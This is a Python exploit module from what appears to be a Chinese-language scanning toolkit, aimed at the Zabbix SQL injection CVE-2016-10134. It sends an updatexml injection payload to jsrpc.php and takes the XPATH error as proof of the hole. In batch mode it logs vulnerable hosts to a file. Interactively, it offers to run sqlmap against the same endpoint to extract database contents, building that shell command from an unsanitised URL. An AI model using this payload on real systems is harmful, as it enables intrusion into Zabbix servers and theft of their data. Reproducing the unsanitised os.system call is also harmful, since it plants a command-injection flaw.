#! /usr/bin/python3
# -*- encoding: utf-8 -*-
import requests,urllib3
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc,OutPrintInfoErr
from pub.com.reqset import ReqSet
from rich.prompt import Prompt
from pub.com.output import OutPutFile
urllib3.disable_warnings()
class Cve_2016_10134:
    def get_url(self,input_url):
        try:
            url = input_url + "/jsrpc.php?type=0&mode=1&method=screen.get&profileIdx=web.item.graph&resourcetype=17&profileIdx2=updatexml(0,concat(0xa,user()),0)"
            req = requests.get(url,headers=self.headers,proxies=self.proxy,verify=self.ssl)
            if "XPATH" in req.text:
                if not self.batch:
                    OutPrintInfoSuc("Zabbix", '目标存在CVE-2016-10134 SQL漏洞')
                    OutPrintInfo("Zabbix", url)
                else:
                    OutPrintInfoSuc("Zabbix", f'目标存在CVE-2016-10134漏洞: {url}')
                    OutPutFile("zabbix_2016_10134.txt",f'目标存在CVE-2016-10134漏洞: {url}')

                return True
            else:
                if not self.batch:
                    OutPrintInfo("Zabbix", f'目标 {input_url} 不存在CVE-2016-10134 SQL漏洞')
                return False
        except Exception as e:
            if not self.batch:
                OutPrintInfo("Zabbix",'目标请求出错')
            return False


    def main(self,target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        header = target["header"]
        self.ssl = target["ssl"]
        proxy = target["proxy"]
        self.headers, self.proxy = ReqSet(header=header, proxy=proxy, bwork=self.batch)
        if not self.batch:
            OutPrintInfo("Zabbix", '开始检测CVE-2016-10134 SQL漏洞...')
        if self.get_url(url):
            if not self.batch:
                choose = Prompt.ask("[b yellow]是否调用sqlmap执行检测([b red]y/n[/b red])")
                if choose == "y":
                    import os
                    try:
                        dir = os.getcwd()
                        OutPrintInfo("SqlMap",f'[b bright_red]Query[/b bright_red]: \n[b magenta]sqlmap -u "{url}/jsrpc.php?type=0&mode=1&method=screen.get&profileIdx=web.item.graph&resourcetype=17&profileIdx2=updatexml(0,concat(0xa,*),0)" --output-dir={dir}/result/ --batch')
                        os.system(f"sqlmap -u \"{url}/jsrpc.php?type=0&mode=1&method=screen.get&profileIdx=web.item.graph&resourcetype=17&profileIdx2=updatexml(0,concat(0xa,*),0)\" --output-dir={dir}/result/ --batch")
                    except Exception as e:
                        OutPrintInfoErr(e)
        if not self.batch:
            OutPrintInfo("Zabbix", 'CVE-2016-10134 SQL漏洞检测结束')

